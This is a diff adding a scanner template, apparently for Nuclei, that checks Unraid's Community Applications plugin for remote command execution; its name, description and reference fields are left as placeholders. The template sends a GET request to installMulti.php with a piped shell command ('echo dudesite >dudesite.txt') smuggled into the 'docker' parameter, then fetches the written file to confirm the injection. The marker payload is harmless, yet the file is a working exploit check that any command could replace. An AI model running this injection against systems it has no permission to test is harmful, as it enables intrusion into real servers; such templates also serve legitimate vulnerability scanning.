@@ -1,0 +1,20 @@
+id: Unraid-OS-installMulti-rce
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: description
+  reference:
+    - https://
+  tags: tags
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/plugins/community.applications/scripts/installMulti.php?docker=222|echo dudesite >dudesite.txt"
+      - "{{BaseURL}}/dudesite.txt"
+      
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'dudesite'
